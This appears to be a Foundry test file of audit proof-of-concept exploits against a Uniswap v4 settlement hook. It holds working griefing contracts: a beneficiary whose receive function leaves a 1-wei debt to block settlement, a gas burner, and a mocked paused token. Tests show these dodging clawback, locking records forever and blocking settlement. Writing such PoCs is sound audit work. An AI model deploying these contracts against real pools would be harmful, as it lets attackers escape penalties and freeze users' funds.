// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;

import {IPoolManager} from "v4-core/interfaces/IPoolManager.sol";
import {IERC20Minimal} from "v4-core/interfaces/external/IERC20Minimal.sol";
import {Currency} from "v4-core/types/Currency.sol";
import {SettlementBase} from "test/unit/Settlement.t.sol";
import {PoolState} from "src/types/PoolState.sol";
import {Record} from "src/types/Record.sol";
import {Payout} from "src/types/Payout.sol";

/// Leaves a 1-wei debt in the PoolManager when paid less than the full deposit. It never reverts, so the
/// hook's try/catch around pushOut sees success; PoolManager.unlock then reverts with CurrencyNotSettled.
contract MockStallingBeneficiary {
    IPoolManager internal immutable PM;
    uint256 public fullRefund;
    bool public alwaysStall;

    constructor(IPoolManager pm) {
        PM = pm;
    }

    function arm(uint256 full, bool always) external {
        fullRefund = full;
        alwaysStall = always;
    }

    receive() external payable {
        if (msg.sender != address(PM)) return;
        if (alwaysStall || msg.value < fullRefund) PM.mint(address(this), 0, 1);
    }
}

/// Burns every unit of gas it is forwarded.
contract MockGasBurner {
    receive() external payable {
        assembly {
            invalid()
        }
    }
}

contract NativeDosPoC is SettlementBase {
    function setUp() public {
        _setUp(0, 6);
    }

    /// Settle reverts for every keeper; after the window the attacker expires for a full refund.
    function test_PoC_StallingBeneficiaryDodgesClawback() public {
        MockStallingBeneficiary ben = new MockStallingBeneficiary(manager);
        Record memory r = _flag(500_000, true, abi.encode(address(ben)));
        assertTrue(r.depositIn0, "deposit in native ETH");
        ben.arm(r.deposit, false);

        uint64 t0 = uint64(r.timestamp) + 3;
        vm.warp(t0);
        bytes[] memory u = _updateRaw(3_300e8, t0, t0 - 1, 0);
        vm.prank(keeper, keeper);
        vm.expectRevert(IPoolManager.CurrencyNotSettled.selector);
        settler.settle(r, u);

        vm.warp(uint256(r.timestamp) + 3 + 1 days);
        vm.prank(keeper, keeper);
        vm.expectRevert(IPoolManager.CurrencyNotSettled.selector);
        settler.settle(r, u);

        uint256 before = address(ben).balance;
        settler.expire(r);
        assertEq(address(ben).balance - before, r.deposit, "full refund, clawback avoided");
    }

    /// With alwaysStall the record can never be finalized: I10 broken, outstanding never released.
    function test_PoC_StallingBeneficiaryLocksRecordForever() public {
        MockStallingBeneficiary ben = new MockStallingBeneficiary(manager);
        Record memory r = _flag(500_000, true, abi.encode(address(ben)));
        ben.arm(r.deposit, true);
        vm.warp(uint256(r.timestamp) + 3 + 30 days);
        vm.expectRevert(IPoolManager.CurrencyNotSettled.selector);
        settler.expire(r);
        PoolState memory st = hook.poolState(id);
        assertEq(st.outstanding0, r.deposit, "deposit still counted against maxOutstanding");
        assertTrue(hook.recordHash(id, r.id) != bytes32(0), "record still open");
    }

    /// Minimal gas for a settlement with an ordinary beneficiary and with a gas-burning one.
    function test_PoC_GasBurnerRaisesSettlementCost() public {
        uint256 normal = _minGas(address(0));
        uint256 burn = _minGas(address(new MockGasBurner()));
        emit log_named_uint("min gas, ordinary beneficiary", normal);
        emit log_named_uint("min gas, gas-burning beneficiary", burn);
        assertGt(burn, normal * 2);
    }

    function _minGas(address ben) internal returns (uint256) {
        bytes memory hd = ben == address(0) ? bytes("") : abi.encode(ben);
        Record memory r = _flag(500_000, true, hd);
        uint64 t0 = uint64(r.timestamp) + 3;
        vm.warp(t0);
        bytes[] memory u = _updateRaw(3_300e8, t0, t0 - 1, 0);
        uint256 lo = 50_000;
        uint256 hi = 30_000_000;
        while (hi - lo > 5_000) {
            uint256 mid = (lo + hi) / 2;
            uint256 snap = vm.snapshotState();
            vm.prank(keeper, keeper);
            bool ok;
            try settler.settle{gas: mid}(r, u) {
                ok = true;
            } catch {}
            vm.revertToState(snap);
            if (ok) hi = mid;
            else lo = mid;
        }
        vm.prank(keeper, keeper);
        settler.settle{gas: hi}(r, u);
        return hi;
    }
}

contract ErcPausePoC is SettlementBase {
    function setUp() public {
        _setUp(18, 6);
    }

    /// A paused or blocklisting deposit token: the tip push is outside the try/catch, so settle reverts
    /// while expire (no tip, refund caught) still succeeds and returns the whole deposit.
    function test_PoC_PausedTokenBlocksSettleButNotExpire() public {
        Record memory r = _flagExactOutBuy(160);
        Currency c = r.depositIn0 ? key.currency0 : key.currency1;
        uint64 t0 = uint64(r.timestamp) + 3;
        vm.warp(t0);
        bytes[] memory u = _updateRaw(3_300e8, t0, t0 - 1, 0);
        vm.mockCallRevert(Currency.unwrap(c), abi.encodeWithSelector(IERC20Minimal.transfer.selector), "paused");
        vm.prank(keeper, keeper);
        vm.expectRevert();
        settler.settle(r, u);

        vm.warp(uint256(r.timestamp) + 3 + 1 days);
        settler.expire(r);
        assertEq(ledger.owed(r.beneficiary, c), r.deposit, "whole deposit deferred to trader");
    }
}
